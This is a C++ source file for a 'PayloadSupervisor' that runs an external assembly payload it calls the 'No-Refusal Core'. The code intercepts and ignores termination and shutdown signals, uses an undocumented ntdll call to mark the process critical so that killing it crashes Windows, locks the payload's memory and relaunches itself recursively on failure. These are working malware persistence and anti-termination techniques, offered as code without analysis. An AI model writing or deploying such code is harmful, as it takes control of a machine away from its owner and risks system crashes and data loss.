#include "PayloadSupervisor.hpp"
#include <iostream>
#include <cstdlib>

// External linkage to the MASM entry point
extern "C" {
    void Payload_Entry();
}

namespace Engine {

    // Static member for console control handler
    PayloadSupervisor* g_supervisorInstance = nullptr;

    BOOL WINAPI PayloadSupervisor::ConsoleCtrlHandler(DWORD dwCtrlType) {
        switch (dwCtrlType) {
            case CTRL_C_EVENT:
            case CTRL_BREAK_EVENT:
            case CTRL_CLOSE_EVENT:
            case CTRL_LOGOFF_EVENT:
            case CTRL_SHUTDOWN_EVENT:
                std::cout << "[!] Termination signal " << dwCtrlType 
                          << " intercepted and ignored.\n";
                return TRUE; // Refuse to exit
            default:
                return FALSE;
        }
    }

    PayloadSupervisor::PayloadSupervisor() 
        : m_isActive(false), m_processHandle(nullptr) {
        m_processHandle = GetCurrentProcess();
        g_supervisorInstance = this;
    }

    bool PayloadSupervisor::InitializeHardening() {
        // 1. Mask common termination signals via SetConsoleCtrlHandler
        if (!SetConsoleCtrlHandler(&PayloadSupervisor::ConsoleCtrlHandler, TRUE)) {
            std::cerr << "[!] Failed to register console control handler.\n";
            return false;
        }

        std::cout << "[+] Console control handler registered.\n";

        // 2. Attempt to set Process Critical state (requires elevated privileges)
        // This makes the OS BSOD if the process is terminated forcefully.
        // Note: This is typically used only in system-critical services.
        typedef NTSTATUS(WINAPI* pNtSetInformationProcess)(
            HANDLE ProcessHandle,
            UINT ProcessInformationClass,
            PVOID ProcessInformation,
            ULONG ProcessInformationLength
        );

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            pNtSetInformationProcess NtSetInformationProcess =
                (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");

            if (NtSetInformationProcess) {
                const UINT ProcessCriticalityClass = 29; // Undocumented
                ULONG isCritical = 1;

                NTSTATUS status = NtSetInformationProcess(
                    m_processHandle,
                    ProcessCriticalityClass,
                    &isCritical,
                    sizeof(isCritical)
                );

                if (status == 0) { // STATUS_SUCCESS
                    std::cout << "[+] Process marked as critical.\n";
                } else {
                    std::cout << "[!] Failed to mark process as critical (may lack privileges).\n";
                }
            }
        }

        return true;
    }

    void PayloadSupervisor::ProtectMemoryRegions() {
        // Protect the code section from being modified or patched at runtime
        DWORD oldProtect = 0;
        DWORD newProtect = PAGE_EXECUTE_READ;

        // Protect a 0x1000 byte region starting at Payload_Entry
        if (VirtualProtect(
            reinterpret_cast<LPVOID>(&Payload_Entry),
            0x1000,
            newProtect,
            &oldProtect)) {
            std::cout << "[+] ASM payload memory protected (PAGE_EXECUTE_READ).\n";
        } else {
            std::cerr << "[!] Failed to protect ASM payload memory.\n";
        }
    }

    void PayloadSupervisor::LaunchCore() {
        m_isActive = true;
        std::cout << "[+] Transitioning execution to MASM No-Refusal Core...\n";
        std::cout << "[+] Entering protected execution loop...\n";

        try {
            // Transfer control to the assembly layer
            Payload_Entry();
        } catch (...) {
            std::cerr << "[!] Critical failure in ASM core. Attempting recovery...\n";
            // Recursive recovery attempt
            LaunchCore();
        }
    }

} // namespace Engine
